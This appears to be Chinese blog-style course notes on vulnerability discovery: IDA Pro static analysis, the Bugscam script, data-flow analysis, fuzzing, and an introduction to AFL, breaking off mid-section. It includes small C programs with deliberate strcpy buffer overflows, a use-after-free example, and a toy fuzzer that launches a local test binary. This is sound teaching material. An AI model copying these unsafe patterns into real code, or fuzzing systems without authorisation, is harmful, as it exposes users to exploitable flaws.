title="实践一：基于词法分析和逆向分析的可执行代码静态检测"></a>实践一：基于词法分析和逆向分析的可执行代码静态检测</h3><p><strong>核心思想</strong>：根据二进制可执行文件的格式特征，从<strong>二进制文件的头部</strong>、<strong>符号表</strong>以及<strong>调试信息中提取安全敏感信息</strong>（<font color=red>识别危险函数</font>），来分析文件中是否存在安全缺陷。</p><ol><li>找到敏感函数，比如memcpy、strcpy等</li><li>回溯函数的参数</li><li>判断栈和操作参数的大小关系，以定位是否发生了<u>溢出漏洞</u></li></ol><h3 id="实验一：基于IDA-Pro分析给定的可执行文件是否存在溢出漏洞"><a href="#实验一：基于IDA-Pro分析给定的可执行文件是否存在溢出漏洞" class="headerlink" title="实验一：基于IDA Pro分析给定的可执行文件是否存在溢出漏洞"></a>实验一：基于IDA Pro分析给定的可执行文件是否存在溢出漏洞</h3><p>对于<code>findoverflow.exe</code>，是通过vc6代码生成的Release版本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void makeoverflow(char *b)&#123;</span><br><span class="line">    char des[5];</span><br><span class="line">    strcpy(des,b);</span><br><span class="line">&#125;</span><br><span class="line">void main(int argc,char *argv[])&#123;</span><br><span class="line">    if(argc&gt;1)    &#123;  </span><br><span class="line">           if(strstr(argv[1],&quot;overflow&quot;)!=0)</span><br><span class="line">                  makeoverflow(argv[1]);</span><br><span class="line">    &#125;   else </span><br><span class="line">          printf(&quot;usage: findoverflow XXXXX\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="第一步：通过IDA打开所生成的exe文件"><a href="#第一步：通过IDA打开所生成的exe文件" class="headerlink" title="第一步：通过IDA打开所生成的exe文件"></a>第一步：通过IDA打开所生成的exe文件</h4><p><img src="/2023/03/15/lou-dong-wa-jue-pian/7ddd3d97d4a4808d78cfd78667678a03.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/7ddd3d97d4a4808d78cfd78667678a03.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>通过该视图，可见，主要有一个<code>main</code>函数，在该函数中可能有跳转，调用了<code>sub_401000</code>函数、<code>_strstr</code>函数和<code>_printf</code>函数。此外，还定义了两个字符串常量，<code>aUsageFindoverf</code>，在其上点右键-&gt;Text view，可以看到：</p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/5bf72c22dafd8a0f4fc6301a2c185af5.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/5bf72c22dafd8a0f4fc6301a2c185af5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>打开main函数汇编代码如下：</p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/6d4227e5df153af22f4dfbd77a95109f.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/6d4227e5df153af22f4dfbd77a95109f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><blockquote><p>注意：通常在IDA的反汇编中，arg_x表示函数参数x的位置，var_8表示局部变量的位置；[]是内存寻址，**[x+arg_x]通常表示的就是arg_x的地址值**。</p><p>由release和debug生成的汇编代码是截然不同的，release版本非常简洁，执行效率优先，debug版本则严格按照语法结构，而且增加了很多方便调试的附加信息。</p></blockquote><h4 id="第二步：定位敏感函数"><a href="#第二步：定位敏感函数" class="headerlink" title="第二步：定位敏感函数"></a>第二步：定位敏感函数</h4><p>在主函数中，Printf函数无任何格式化参数存在，因此，敏感函数的可能在于sub_401000函数中，打开该函数的代码如图所示：</p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/f25857d5f6215bcb986f3acd66bcec2e.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/f25857d5f6215bcb986f3acd66bcec2e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>一个输入参数arg_0，一个局部变量var_8。</li><li>通过“lea edx, [esp+8+var_8]”和“mov edi, edx”可知，向目标寄存器存储了目标字符串的地址，为局部变量var_8；</li><li>通过“mov edi,[esp+10h+arg_0]”以及后面的“mov esi, edi”，可知，将函数的输入参数作为源字符串。</li></ul><p>那么到底是否发生了溢出呢？</p><p>通过“sub esp 8”可以知道栈大小为8，因此，函数的局部变量var_8的大小最大就是8。这样的话，可以得到sub_401000函数的代码结构大致如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Sub_401000(arg_0)</span><br><span class="line">&#123;</span><br><span class="line">    Char var_8[8];</span><br><span class="line">    Strcpy(var_8, arg_0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果输入的字符串的长度大于8，就可能发生溢出了——需要验证。</p><p><font color=red>为什么是8，而不是源代码里的5？</font></p><p>打开DOS对话框，运行示例程序，如果不给任何参数的话，会提示：usage: findoverflow XXXXX<br>如果输入参数，比如：findoverflow ssssssssss。却可以运行成功。<br>这是为什么呢？回顾逆向的反汇编代码，可以知道：</p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/41ea5fae271f7eebaacef024c2f16dd3.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/41ea5fae271f7eebaacef024c2f16dd3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>由于程序需要先判断是否包含子串overflow，因此，需要构造的输入需要满足这个条件。</p><p>输入：findoverflow overflow，此时出现缓冲区溢出的弹出窗口了。<br><strong>基于此溢出漏洞，就可以进行漏洞的利用了。</strong></p><h3 id="实验二：使用Bugscam脚本来代替手工过程完成漏洞挖掘"><a href="#实验二：使用Bugscam脚本来代替手工过程完成漏洞挖掘" class="headerlink" title="实验二：使用Bugscam脚本来代替手工过程完成漏洞挖掘"></a>实验二：使用Bugscam脚本来代替手工过程完成漏洞挖掘</h3><p>Bugscam是一个IDA工具的idc脚本的轻量级的漏洞分析工具，通过检测栈溢出漏洞的<code>strcpy</code>，<code>sprintf</code>危险函数的位置，然后根据这些函数的参数，确定是否有缓冲区溢出漏洞。</p><p>下载网址：<a href="https://sourceforge.net/projects/bugscam/">https://sourceforge.net/projects/bugscam/</a></p><ol><li>1、<strong>将Bugscam文件解压放到任意地方</strong>，然后<strong>修改</strong>globalvar.idc文件中头行的bugscam_dir为你的bugscam<strong>目录的全路径</strong>（路径不能含有中文）。</li><li>启动ida，<strong>加载任意一个x86程序文件（本例为idc.exe）</strong>，然后<strong>打开脚本文件</strong><code>run_analysis.idc</code>，运行即可，等待分析完毕，最后的分析报告结果保存在reports目录中的html文件中。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">void vul(char*bu1)&#123;</span><br><span class="line">    char a[200];</span><br><span class="line">    lstrcpy(a,bu1);</span><br><span class="line">                 printf(&quot;%s&quot;,a);</span><br><span class="line">    return;    &#125;</span><br><span class="line">void main()&#123;</span><br><span class="line">    char b[1024];</span><br><span class="line">    memset(b,&#x27;l&#x27;,sizeof(b));</span><br><span class="line">    vul(b);      &#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/15/lou-dong-wa-jue-pian/1e9f22982a27978274eacd6f9cd9e27a.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/1e9f22982a27978274eacd6f9cd9e27a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>其中，<u>Severity是威胁等级，越高说明漏洞危险级别越高</u>。本例的程序中，lstrcpyA函数存在溢出漏洞，地址401010处的代码可能将向目标203字节的区域写入1024字节的数据。</p><h1 id="数据流分析"><a href="#数据流分析" class="headerlink" title="数据流分析"></a>数据流分析</h1><h2 id="基本概念-1"><a href="#基本概念-1" class="headerlink" title="基本概念"></a>基本概念</h2><p><strong>数据流分析</strong>是一种用来获取<u>相关数据沿着程序执行路径流动的信息分析技术</u>，分析对象是程序执行路径上的<u>数据流动或可能的取值</u>。</p><p>按照分析程序路径的深度，将数据流分析分为<strong>过程内分析</strong>和<strong>过程间分析</strong>。</p><h2 id="数据流分析方法分类"><a href="#数据流分析方法分类" class="headerlink" title="数据流分析方法分类"></a>数据流分析方法分类</h2><p><strong>过程内分析</strong>只针对程序中函数内的代码进行分析，又分为：</p><ul><li>流不敏感分析(flow insensitive)：按代码行号从上而下进行分析；</li><li>流敏感分析(flow sensitive)：首先产生<strong>程序控制流图</strong>(Control FLow Graph，CFG)，再按照CFG的拓扑排序正向或逆行分析；</li><li>路径敏感分析(path sensitive)：不仅考虑到语句的先后顺序，还会考虑语句可达性，即会沿实际可执行到路径进行分析。</li></ul><p><strong>过程间分析</strong>则考虑函数之间的数据流，即需要跟踪分析目标数据在函数之间的传递过程。</p><ul><li>上下文不敏感分析：忽略调用位置和函数取值等函数调用的相关信息。</li><li>上下文敏感分析：对不同调用位置调用的同意函数加以区分。</li></ul><h2 id="程序代码模型"><a href="#程序代码模型" class="headerlink" title="程序代码模型"></a>程序代码模型</h2><p><u>数据流分析使用的程序代码模型</u>主要包括<strong>程序代码的中间表示</strong>以及一些<strong>关键的数据结构</strong>，利用程序代码的中间表示可以对程序语句的指令语义进行分析。</p><p><strong>抽象语法树</strong>。是程序抽象语法结构的树状表现形式，其<u>每个内部节点代表一个运算符</u>，该节点的<u>子节点代表这个运算符的运算分量</u>。通过描述控制转移语句的语法结构，抽象语法树在一定程度上也描述了程序的过程内代码的控制流结构。<br>举例，对于表达式“1+3*(4-1)+2”，其抽象语法树为：</p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/eb993a57d6c3f8ac0783346a45173a47.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/eb993a57d6c3f8ac0783346a45173a47.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><strong>三地址码</strong>。三地址码（Three address code，TAC）是一种<strong>中间语言</strong>，由一组类似于汇编语言的指令组成，每个指令具有不多于三个的运算分量。每个运算分量都像是一个寄存器。</p><p>通常的三地址码指令包括下面几种：</p><p><code>x = y op z </code>：表示 y 和 z 经过 op 指示的计算将结果存入 x<br><code>x = op y</code> ：表示 y 经过操作 op 的计算将结果存入 x<br><code>x = y</code> ：表示赋值操作<br><code>goto L</code> ：表示无条件跳转<br><code>if x goto L</code> ：表示条件跳转<br><code>x = y[i]</code> ：表示数组赋值操作<br><code>x = &amp;y 、 x = *y</code> ：表示对地址的操作<br><code>param x1, param x2, call p</code>：表示过程调用 p(x1, x2)</p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/6fbf143721383084d76afb912e74ad50.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/6fbf143721383084d76afb912e74ad50.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><strong>控制流图</strong>。控制流图(Control FLow Graph，CFG)通常是指用于<strong>描述程序过程内</strong>的控制流的<strong>有向图</strong>。控制流由节点和有向边组成。节点可以是单条语句或程序代码段。有向边表示节点之间存在潜在的控制流路径。</p><p>(a)有一个if-then-else语句；(b)有一个while循环;</p><p>(c)有两个出口的自然环路;(d)有两个入口的循环。</p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/8a9ccd6ebfc59baf5cd5e82893b3f1b8.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/8a9ccd6ebfc59baf5cd5e82893b3f1b8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><strong>调用图</strong>。调用图(Call Graph，CG)是描述<strong>程序中过程之间</strong>的调用和被调用关系的有向图，满足如下原则：对程序中的每个过程都有一个节点；对每个调用点都有一个节点；如果调用点c调用了过程p，就存在一条从c的节点到p的节点的边。</p><h2 id="基于数据流的漏洞分析流程"><a href="#基于数据流的漏洞分析流程" class="headerlink" title="基于数据流的漏洞分析流程"></a>基于数据流的漏洞分析流程</h2><p>基于数据流的漏洞分析技术是通过分析软件代码中<strong>变量的取值变化</strong>和<strong>语句的执行情况</strong>，来<strong>分析数据处理逻辑和程序的控制流关系</strong>，从而分析软件代码的潜在安全缺陷。基于数据流的漏洞分析的一般流程为：</p><ul><li>首先，进行代码建模，将代码构造为<u>抽象语法树或程序控制流图</u>；</li><li>然后，追踪获取变量的变化信息，根据<strong>漏洞分析规则</strong>检测安全缺陷和漏洞。</li></ul><p>基于数据流的漏洞分析非常<strong>适合检查因控制流信息非法操作而导致的安全问题</strong>，如内存访问越界、常数传播等。由于对于逻辑复杂的软件代码，其数据流复杂，并呈现多样性的特点，因而检测的<u>准确率较低，误报率较高</u>。</p><h3 id="示例一：检测指针变量的错误使用"><a href="#示例一：检测指针变量的错误使用" class="headerlink" title="示例一：检测指针变量的错误使用"></a>示例一：检测指针变量的错误使用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int contrived(int *p, int *w, int x) &#123;</span><br><span class="line">  int *q;</span><br><span class="line">  if (x) &#123;</span><br><span class="line">    kfree(w); // w free</span><br><span class="line">    q = p;</span><br><span class="line">  &#125;else</span><br><span class="line">    q=w;</span><br><span class="line">  return *q; // p use after free</span><br><span class="line">&#125;</span><br><span class="line">int contrived_caller(int *w, int x, int *p) &#123;</span><br><span class="line">  kfree(p); // p free</span><br><span class="line">  [...]</span><br><span class="line">  int r = contrived(p, w, x);</span><br><span class="line">  [...]</span><br><span class="line">  return *w; // w use after free</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在检测指针变量的错误使用时，我们关心的是变量的状态。左侧代码可能出现<code>use-after-free</code>漏洞。</p><p><strong>漏洞分析规则</strong>。下面是用于检测指针变量错误使用的检测规则：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v 被分配空间 &gt; v.start</span><br><span class="line">v.start: &#123;kfree(v)&#125; &gt; v.free</span><br><span class="line">v.free: &#123;*v&#125; &gt; v.useAfterFree</span><br><span class="line">v.free: &#123;kfree(v)&#125; &gt; v.doubleFree</span><br></pre></td></tr></table></figure><p><strong>代码建模</strong>。这里我们采用路径敏感的数据流分析，控制流图如下</p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/48972ef60673cc4a87055e8dc83c0c82.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/48972ef60673cc4a87055e8dc83c0c82.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><strong>漏洞分析</strong>。分析过程从函数contrived_caller的入口点开始，可知调用函数contrived的时候p的状态为p.free。分析函数contrived中的两条路径：</p><ul><li><strong>1-&gt;2-&gt;3-&gt;4-&gt;6</strong>：在进行到6时，6的前置条件是p.free、w.free、q.free，此时语句return *q将触发use-after-free规则并设置q.useAfterFree状态。然后返回到函数contrived_caller的4，其前置条件为p.useAfterFree、w.free，此时语句return *w设置w.useAfterFree。因此，存在use-after-free漏洞。 </li><li><strong>1-&gt;2-&gt;5-&gt;6</strong>：该路径是安全的。</li></ul><h3 id="示例二：检测缓冲区溢出"><a href="#示例二：检测缓冲区溢出" class="headerlink" title="示例二：检测缓冲区溢出"></a>示例二：检测缓冲区溢出</h3><p>在检测缓冲区溢出时，我们<strong>关心的是变量的取值</strong>，并在一些预定义的<strong>敏感操作</strong>所在的程序点上，<strong>对变量的取值进行检查</strong>。下面是一些记录变量的取值的规则。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">char s[n];                    // len(s) = n</span><br><span class="line">strcpy(des, src);          // len(des) &gt; len(src)</span><br><span class="line">strncpy(des, src, n);    // len(des) &gt; min(len(src), n)</span><br><span class="line">s = &quot;foo&quot;;                    // len(s) = 4</span><br><span class="line">strcat(s, suffix);          // len(s) = len(s) + len(suffix) - 1</span><br><span class="line">fgets(s, n, ...);             // len(s) &gt; n</span><br></pre></td></tr></table></figure><h1 id="模糊测试"><a href="#模糊测试" class="headerlink" title="模糊测试"></a>模糊测试</h1><h2 id="基本概念-2"><a href="#基本概念-2" class="headerlink" title="基本概念"></a>基本概念</h2><ul><li>模糊测试(Fuzzing)是一种自动化或半自动化的安全漏洞检测技术，通过向目标软件输入大量的<font color=red>畸形数据</font>并<strong>监测目标系统的异常</strong>来发现潜在的软件漏洞。</li><li>模糊测试属于<strong>黑盒测试</strong>的一种，它是一种有效的动态漏洞分析技术，黑客和安全技术人员使用该项技术已经发现了大量的未公开漏洞。</li><li>它的缺点是<strong>畸形数据的生成具有随机性</strong>，而随机性造成代码覆盖不充分导致<strong>测试数据覆盖率不高</strong>。</li></ul><h2 id="模糊测试分类"><a href="#模糊测试分类" class="headerlink" title="模糊测试分类"></a>模糊测试分类</h2><h3 id="基于生成的模糊测试"><a href="#基于生成的模糊测试" class="headerlink" title="基于生成的模糊测试"></a>基于生成的模糊测试</h3><p>它是指<strong>依据特定的文件格式或者协议规范组合生成测试用例</strong>，该方法的关键点在于既要<font color=red>遵守被测程序的输入数据的规范要求</font>，又要能变异出区别于正常的数据。</p><h3 id="基于变异的迷糊测试"><a href="#基于变异的迷糊测试" class="headerlink" title="基于变异的迷糊测试"></a>基于变异的迷糊测试</h3><p>它是指<strong>在原有合法的测试用例基础上，通过变异策略生成新的测试用例</strong>。变异策略可以是<u>随机变异策略</u>、<u>边界值变异策略</u>、<u>位变异策略等</u>等，但前提条件是给定的初始测试用例是<strong>合法的输入</strong>。</p><h2 id="模糊测试步骤"><a href="#模糊测试步骤" class="headerlink" title="模糊测试步骤"></a>模糊测试步骤</h2><ol><li>确定测试对象和输入数据</li></ol><blockquote><p>由于所有可被利用的漏洞都是由于应用程序接受了<strong>用户输入的数据</strong>造成的，并且在处理输入数据时没有首先过滤非法数据或者进行校验确认。对模糊测试来说<strong>首要的问题是确定可能的输入数据，畸形输入数据的枚举对模糊测试至关重要</strong>。</p></blockquote><ol start="2"><li>生成模糊测试数据</li></ol><blockquote><p>一旦确定了输入数据，接着就可以生成模糊测试用的畸形数据。根据目标程序及输入数据格式的不同，可相应选择不同的测试数据生成算法。 </p></blockquote><ol start="3"><li>检测模糊测试数据</li></ol><blockquote><p>检测模糊测试数据的过程首先要<strong>启动目标程序</strong>，然后<strong>把生成的测试数据输入到应用程序中进行处理</strong>。 </p></blockquote><ol start="4"><li>监测程序异常</li></ol><blockquote><p>在模糊测试过程中，一个非常重要但却经常被忽视的步骤是对程序异常的监测。实时监测目标程序的运行，就能追踪到引发目标程序异常的源测试数据。 </p></blockquote><ol start="5"><li>确定可利用性</li></ol><blockquote><p>一旦监测到程序出现的异常，还需要<strong>进一步确定所发现的异常情况是否能被进一步利用</strong>。这个步骤不是模糊测试必需的步骤，只是检测这个异常对应的漏洞是否可以被利用。这个步骤<strong>一般由手工完成</strong>，需要分析人员具备深厚的漏洞挖掘和分析经验。</p></blockquote><p><img src="/2023/03/15/lou-dong-wa-jue-pian/cacf4f48856672f612de79e96a8c0962.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/cacf4f48856672f612de79e96a8c0962.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>除了最后一步确定可利用性外，所有其它的四个阶段都是必须的。</p><p>尽管模糊测试对安全缺陷和漏洞的检测能力很强，但并不是说它对被测软件都能发现所有的错误，原因就是它测试样本的生成方式具有<strong>随机性</strong>。 </p><h2 id="智能模糊测试"><a href="#智能模糊测试" class="headerlink" title="智能模糊测试"></a>智能模糊测试</h2><ul><li>模糊测试方法是应用最普遍的动态安全检测方法，但由于模糊测试数据的生成具有随机性，<strong>缺乏对程序的理解</strong>，测试的性能不高，并且难以保证一定的覆盖率。</li><li>为了解决这个问题，引入了基于符号执行、污点传播分析等可进行程序理解的方法，在实现<strong>程序理解</strong>的基础上，有针对性的设计测试数据的生成，从而实现了比传统的随机模糊测试更高的效率，这种结合了程序理解和模糊测试的方法，称为<strong>智能模糊测试</strong>(smart Fuzzing)技术。</li></ul><h3 id="智能模糊测试具体的实现步骤"><a href="#智能模糊测试具体的实现步骤" class="headerlink" title="智能模糊测试具体的实现步骤"></a>智能模糊测试具体的实现步骤</h3><ol><li>反汇编</li></ol><blockquote><p>智能模糊测试的前提，是对可执行代码进行输入数据、控制流、执行路径之间相关关系的分析。为此，首先对可执行代码进行反汇编得到<strong>汇编代码</strong>，在汇编代码的基础上才能进行上述分析。</p></blockquote><ol start="2"><li>中间语言转换</li></ol><blockquote><p>从汇编代码中直接获取程序运行的内部信息，工作量较大，为此，需要将汇编代码转换成中间语言，由于<strong>中间语言易于理解</strong>，所以为可执行代码的分析提供了一种有效的手段。</p></blockquote><ol start="3"><li>采用智能技术分析输入数据和执行路径的关系</li></ol><blockquote><p>这一步是智能模糊测试的关键，它通过符号执行和约束求解技术、污点传播分析、执行路径遍历等技术手段，检测出<strong>可能产生漏洞的程序执行路径集合和输入数据集合</strong>。例如，利用符号执行技术在符号执行过程中记录下输入数据的传播过程和传播后的表达形式，并通过约束求解得到在漏洞触发时执行的路径与原始输入数据之间的联系，从而得到触发执行路径异常的输入数据。</p></blockquote><ol start="4"><li>利用分析获得的输入数据集合，对执行路径集合进行测试</li></ol><blockquote><p>采用上述智能技术获得的输入数据集合进行安全检测，<strong>使后续的安全测试检测出安全缺陷和漏洞的机率大大增加</strong>。与传统的随机模糊测试技术相比，这些<strong>智能模糊测试技术</strong>的应用，由于了解了输入数据和执行路径之间的关系，因而<strong>生成的输入数据更有针对性</strong>，减少了大量无关测试数据的生成，提高了测试的效率。此外，在触发漏洞的同时，智能模糊测试技术包含了对漏洞成因的分析，极大减少了分析人员的工作量。</p></blockquote><h3 id="智能模糊测试的核心思想"><a href="#智能模糊测试的核心思想" class="headerlink" title="智能模糊测试的核心思想"></a>智能模糊测试的核心思想</h3><p><strong>在于以尽可能小的代价找出程序中最有可能产生漏洞的执行路径集合</strong>，从而避免了盲目地对程序进行全路径覆盖测试，使得漏洞分析更有针对性。<br>智能模糊测试技术的提出，反映了软件安全性测试由模糊化测试向精确化测试转变的趋势。是典型的技术融合的漏洞挖掘测试方法。</p><h2 id="模糊测试实践"><a href="#模糊测试实践" class="headerlink" title="模糊测试实践"></a>模糊测试实践</h2><h3 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h3><p>用来实现Fuzzing测试的工具叫做Fuzzer。</p><p>成品的Fuzzer工具很多，许多是非常优秀的。Fuzzer根据测试类型可以分为很多类，常见的分类包括：<strong>文件型Fuzzer</strong>、网络型Fuzzer、接口型Fuzzer等。</p><p>下方工具可以生成多个文件测试用例，发现了Office2003的典型漏洞。</p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/51ffe1ce3d9c9227a5be06267f46733b.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/51ffe1ce3d9c9227a5be06267f46733b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="自己动手写Fuzzer"><a href="#自己动手写Fuzzer" class="headerlink" title="自己动手写Fuzzer"></a>自己动手写Fuzzer</h3><p>使用模糊测试工具在很多时候不能解决所有问题：</p><ul><li>比如：被测试的目标程序对测试数据有一定的要求，而实际的Fuzzer不能灵活调整发送的测试数据；被测试的目标程序过于简单或者难，而<strong>现有的Fuzzer程序不能提供适合的测试</strong>。</li><li><strong>作为漏洞发掘者我们最好能学会编写一个Fuzzer</strong>，这样就可以随时随地的进行安全测试。而事实上，<u>目前的多数漏洞挖掘过程，是需要自己手动编写Fuzzer来完成</u>。</li></ul><p>对于目标的可执行文件overflow.exe文件，是由如下程序生成的exe程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt; </span><br><span class="line">void overflow(char *b)&#123;</span><br><span class="line">    char des[50];</span><br><span class="line">    strcpy(des,b);</span><br><span class="line">&#125;</span><br><span class="line">void main(int argc,char *argv[])&#123;</span><br><span class="line">    if(argc&gt;1)    &#123; </span><br><span class="line">        overflow(argv[1]);</span><br><span class="line">    &#125;   else </span><br><span class="line">        printf(&quot;usage: overflow XXXXX\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>书写Fuzzer</strong>。在明确了输入的要求和暴力测试的循环条件后，可以写出如下的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">void main(int argc,char *argv[])&#123; </span><br><span class="line">    char *testbuf=&quot; &quot;;    char buf[1024];</span><br><span class="line">    memset(buf,0,1024); </span><br><span class="line">    if(argc&gt;1) &#123; </span><br><span class="line">        for(int i=20;i&lt;50;i=i+2) &#123;</span><br><span class="line">          testbuf=new char[i];</span><br><span class="line">           memset(testbuf,&#x27;c&#x27;,i); </span><br><span class="line">          memcpy(buf,testbuf,i);     </span><br><span class="line">          ShellExecute(NULL,&quot;open&quot;,argv[1],buf,NULL,SW_NORMAL);</span><br><span class="line">          delete testbuf;&#125;</span><br><span class="line">     &#125;</span><br><span class="line">    else printf(&quot;Fuzzing X \n其中X为被测试目标程序所在路径&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过一个<code>for</code>循环（循环次数根据实际情况去设计）<strong>构造不同的字符串作为输入</strong>，通过<code>“ShellExecute(NULL,&quot;open&quot;,argv[1],buf,NULL,SW_NORMAL); “</code>来<strong>实现对目标程序的模糊测试</strong>。<br>上述Fuzzer的调用格式为：Fuzzing X 。X表示目标程序。<br>请完成上述实验并进行结果验证。</p><h1 id="AFL模糊测试框架"><a href="#AFL模糊测试框架" class="headerlink" title="AFL模糊测试框架"></a>AFL模糊测试框架</h1><h2 id="AFL模糊测试框架-1"><a href="#AFL模糊测试框架-1" class="headerlink" title="AFL模糊测试框架"></a>AFL模糊测试框架</h2><ul><li>AFL是一款<font color=red>基于覆盖引导（Coverage-guided）</font>的模糊测试工具，它通过<strong>记录输入样本的代码覆盖率</strong>，从而调整输入样本以<strong>提高覆盖率</strong>，增加发现漏洞的概率。</li><li>AFL主要用于C/C++程序的测试，被测程序有无程序源码均可，有源码时可以对源码进行编译时插桩，无源码可以借助QEMU的User_Mode模式进行二进制插桩。</li><li>支持多平台（ARM、X86、X64）、多系统（Linux、BSD、Windows、MacOS），性能高。</li></ul><h2 id="AFL工作流程"><a href="#AFL工作流程" class="headerlink" title="AFL工作流程"></a>AFL工作流程</h2><ul><li>从源码编译程序时进行<strong>插桩</strong>，以<strong>记录代码覆盖率</strong>；</li><li>选择一些输入文件作为初始测试集加入输入队列；</li><li>将队列中的文件按策略进行<strong>“突变”</strong>；</li><li><font color=red>如果经过变异文件更新了覆盖范围，则保留在队列中；</font></li><li>循环进行，期间<strong>触发了crash（异常结果）的文件</strong>会被记录下来。</li></ul><p><img src="/2023/03/15/lou-dong-wa-jue-pian/44936da4faf41a7e6095e54730362d1a.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/44936da4faf41a7e6095e54730362d1a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="AFL安装"><a href="#AFL安装" class="headerlink" title="AFL安装"></a>AFL安装</h2><p><img src="/2023/03/15/lou-dong-wa-jue-pian/767dfe02556cda1812d7d3d2825a380c.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/767dfe02556cda1812d7d3d2825a380c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="AFL模糊测试"><a 